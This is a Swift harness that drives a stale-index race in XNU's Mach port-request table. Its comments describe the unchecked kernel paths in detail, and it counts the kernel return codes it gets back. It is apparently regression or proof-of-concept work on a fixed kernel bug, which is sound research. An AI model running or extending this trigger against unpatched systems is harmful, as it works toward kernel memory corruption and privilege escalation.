import Foundation
import Darwin

/// Mach-IPC surface exercises for the XNU cluster fixed in 27.2.
///
/// The 27.2 kernel added a validation wave over every index-consumer of the per-space
/// port-request table (ipc_port.c:21/24/34/38/40/41 — `ipr != NULL`, `table != NULL`).
/// The pre-fix paths index that table with the space's *saved* request-table index and
/// never compare it to the table size:
///
///   free path   — bounds are computed into a register and then DISCARDED; the unchecked
///                 base still does `ldr` / `str w11,[x12,#8]` / `str xzr,[x12]`.
///   mark path   — `add x8, x8, w2, uxtw #4` with no bounds computation at all, then a
///                 read-modify-write of a bit in whatever it lands on.
///   type query  — `ldr x8, [x8, x9]` with no check; the loaded bits classify the
///                 notification type returned to the caller.
///
/// The reachable shape is a stale-index race: request-table grow / teardown concurrent
/// with a notification registration or a send. This harness drives exactly that
/// interleaving and counts the kernel's own return codes.
///
/// Resource discipline is the hard constraint here. The task port name space is finite
/// (a few thousand entries); a harness that allocates without bound gets the process
/// SIGKILLed by jetsam long before it proves anything, and that kill is indistinguishable
/// from a crash in the journal. So every port is tracked, every right is released, and a
/// hard budget caps total allocation per run.
enum KernelIPC {

    /// Ceiling on simultaneously live port names. Well under the name-space limit, so the
    /// process is never the thing that fails.
    private static let liveBudget = 512
    /// Ceiling on total allocations per run, to bound wall-clock and churn.
    private static let totalBudget = 6_000

    struct Stats {
        var operations: Int = 0
        var allocations: Int = 0
        var notifications: Int = 0
        var sends: Int = 0
        var deallocations: Int = 0
        var budgetExhausted = false
        var notificationsRefused = 0
        var kernelErrors: [String: Int] = [:]

        var summary: String {
            var s = "ops=\(operations) alloc=\(allocations) notify=\(notifications) "
            s += "send=\(sends) dealloc=\(deallocations)"
            if budgetExhausted { s += tl("\n(达到资源预算，提前收敛 —— 这是刻意的，不是失败)") }
            if notificationsRefused > 0 {
                s += tl("\n通知注册被拒 ") + "\(notificationsRefused)" + tl(" 次 —— 该平台不允许对自身端口注册通知，")
                s += tl("请求表路径无法被武装。真机上应返回 KERN_SUCCESS。")
            }
            if !kernelErrors.isEmpty {
                s += "\n" + kernelErrors.sorted { $0.value > $1.value }
                    .map { "  \($0.key) × \($0.value)" }.joined(separator: "\n")
            } else {
                s += tl("\n内核未返回任何错误码")
            }
            return s
        }
    }

    static func name(_ kr: kern_return_t) -> String {
        switch kr {
        case KERN_SUCCESS: return "KERN_SUCCESS"
        case KERN_INVALID_NAME: return "KERN_INVALID_NAME"
        case KERN_INVALID_RIGHT: return "KERN_INVALID_RIGHT"
        case KERN_INVALID_ARGUMENT: return "KERN_INVALID_ARGUMENT"
        case KERN_NO_SPACE: return "KERN_NO_SPACE"
        case KERN_UREFS_OVERFLOW: return "KERN_UREFS_OVERFLOW"
        case KERN_INVALID_CAPABILITY: return "KERN_INVALID_CAPABILITY"
        case KERN_PROTECTION_FAILURE: return "KERN_PROTECTION_FAILURE"
        case KERN_NO_ACCESS: return "KERN_NO_ACCESS"
        case KERN_RESOURCE_SHORTAGE: return "KERN_RESOURCE_SHORTAGE"
        case MACH_SEND_NO_BUFFER: return "MACH_SEND_NO_BUFFER"
        case MACH_SEND_INVALID_DEST: return "MACH_SEND_INVALID_DEST"
        default: return "kr=\(kr)"
        }
    }

    /// One worker's ring of ports: allocate, arm two notification types, half-teardown,
    /// send into the survivors, then release everything. Returns the counters it produced.
    private static func ring(task: mach_port_t, depth: Int, budget: inout Int,
                             refused: inout Int,
                             record: (kern_return_t) -> Void) -> (alloc: Int, notify: Int, send: Int, dealloc: Int) {
        var alloc = 0, notify = 0, send = 0, dealloc = 0

        var ports: [mach_port_name_t] = []
        ports.reserveCapacity(depth)

        for _ in 0..<depth {
            guard budget > 0 else { break }
            var n: mach_port_name_t = 0
            let kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &n)
            if kr == KERN_SUCCESS {
                ports.append(n)
                alloc += 1
                budget -= 1
            } else {
                record(kr)
                break
            }
        }

        // Two notification types per port. MACH_MSG_TYPE_MAKE_SEND on our own receive
        // right keeps the port alive without an extra explicit right to clean up.
        for p in ports {
            var prev: mach_port_t = 0
            let kr1 = mach_port_request_notification(
                task, p, MACH_NOTIFY_SEND_POSSIBLE, 1, p,
                mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND), &prev)
            if kr1 != KERN_SUCCESS { record(kr1); if kr1 == KERN_INVALID_CAPABILITY { refused += 1 } }
            if prev != 0 { _ = mach_port_mod_refs(task, prev, MACH_PORT_RIGHT_SEND, -1) }
            notify += 1

            var prev2: mach_port_t = 0
            let kr2 = mach_port_request_notification(
                task, p, MACH_NOTIFY_DEAD_NAME, 0, p,
                mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND), &prev2)
            if kr2 != KERN_SUCCESS { record(kr2); if kr2 == KERN_INVALID_CAPABILITY { refused += 1 } }
            if prev2 != 0 { _ = mach_port_mod_refs(task, prev2, MACH_PORT_RIGHT_SEND, -1) }
            notify += 1
        }

        // Teardown half the ring while the other half still holds armed notifications —
        // that is the interleaving the request table has to survive.
        //
        // Never decrement a right we do not hold: on the simulator `mach_port_mod_refs`
        // with a negative delta against a zero send-ref count does not return an error,
        // it SIGKILLs the process. Check first, always.
        for (i, p) in ports.enumerated() where i % 2 == 0 {
            var refs: mach_port_urefs_t = 0
            if mach_port_get_refs(task, p, MACH_PORT_RIGHT_SEND, &refs) == KERN_SUCCESS, refs > 0 {
                let kr = mach_port_mod_refs(task, p, MACH_PORT_RIGHT_SEND, -1)
                if kr != KERN_SUCCESS { record(kr) }
            }
            dealloc += 1
        }

        for (i, p) in ports.enumerated() where i % 2 == 1 {
            var header = mach_msg_header_t()
            header.msgh_bits = mach_msg_bits_t(MACH_MSG_TYPE_COPY_SEND)
            header.msgh_size = mach_msg_size_t(MemoryLayout<mach_msg_header_t>.size)
            header.msgh_remote_port = p
            header.msgh_local_port = 0
            header.msgh_id = 0
            let kr = mach_msg_send(&header)
            if kr != KERN_SUCCESS { record(kr) }
            send += 1
        }

        // Release every remaining right, then the name. `mach_port_destruct` with a
        // urefs delta of 0 only succeeds once the right count is already 0, which is why
        // the mod_refs above has to happen first.
        for p in ports {
            var urefs: mach_port_urefs_t = 0
            if mach_port_get_refs(task, p, MACH_PORT_RIGHT_SEND, &urefs) == KERN_SUCCESS, urefs > 0 {
                _ = mach_port_mod_refs(task, p, MACH_PORT_RIGHT_SEND, -Int32(urefs))
            }
            let kr = mach_port_destruct(task, p, 0, 0)
            if kr != KERN_SUCCESS {
                // fall back to destroy, which tolerates outstanding rights
                _ = mach_port_destroy(task, p)
            }
            dealloc += 1
        }
        return (alloc, notify, send, dealloc)
    }

    /// Drive the interleaving for `seconds`, with a bounded number of workers and a hard
    /// allocation budget shared across all of them.
    static func race(seconds: TimeInterval = 6.0, workers: Int = 4, depth: Int = 48) -> Stats {
        var stats = Stats()
        let lock = NSLock()
        let deadline = Date().addingTimeInterval(seconds)
        let task = mach_task_self_
        var budget = totalBudget

        func record(_ kr: kern_return_t) {
            guard kr != KERN_SUCCESS else { return }
            lock.lock()
            stats.kernelErrors[name(kr), default: 0] += 1
            lock.unlock()
        }

        DispatchQueue.concurrentPerform(iterations: workers) { _ in
            var localAlloc = 0, localNotify = 0, localSend = 0, localDealloc = 0, localOps = 0

            while Date() < deadline {
                lock.lock()
                let remaining = budget
                lock.unlock()
                if remaining <= 0 {
                    lock.lock(); stats.budgetExhausted = true; lock.unlock()
                    break
                }

                var slice = min(depth, remaining)
                var localRefused = 0
                let result = ring(task: task, depth: slice, budget: &slice, refused: &localRefused) { record($0) }
                if localRefused > 0 {
                    lock.lock(); stats.notificationsRefused += localRefused; lock.unlock()
                }
                localAlloc += result.alloc
                localNotify += result.notify
                localSend += result.send
                localDealloc += result.dealloc
                localOps += 4

                lock.lock()
                budget -= result.alloc
                lock.unlock()
            }

            lock.lock()
            stats.operations += localOps
            stats.allocations += localAlloc
            stats.notifications += localNotify
            stats.sends += localSend
            stats.deallocations += localDealloc
            lock.unlock()
        }

        return stats
    }

    /// Cheap baseline: does the process even hold a send right to the bootstrap port, and
    /// can it enumerate its own port space? Everything past this is privilege work.
    static func baseline() -> [String: String] {
        var out: [String: String] = [:]
        let task = mach_task_self_

        var bootstrap: mach_port_t = 0
        let kr = task_get_special_port(task, TASK_BOOTSTRAP_PORT, &bootstrap)
        out["bootstrap"] = "\(name(kr)) port=\(bootstrap)"

        var names: mach_port_name_array_t?
        var types: mach_port_type_array_t?
        var nameCount: mach_msg_type_number_t = 0
        var typeCount: mach_msg_type_number_t = 0
        let kr2 = mach_port_names(task, &names, &nameCount, &types, &typeCount)
        out["port_names"] = "\(name(kr2)) count=\(nameCount)"
        if let n = names {
            vm_deallocate(task,
                          vm_address_t(UInt(bitPattern: n)),
                          vm_size_t(nameCount) * vm_size_t(MemoryLayout<mach_port_name_t>.size))
        }
        if let t = types {
            vm_deallocate(task,
                          vm_address_t(UInt(bitPattern: t)),
                          vm_size_t(typeCount) * vm_size_t(MemoryLayout<mach_port_type_t>.size))
        }

        // The name-space ceiling matters for how hard the race can be driven.
        out["name_space"] = "\(nameCount)" + tl(" 已用 / 预算 ") + "\(liveBudget)"
        return out
    }
}
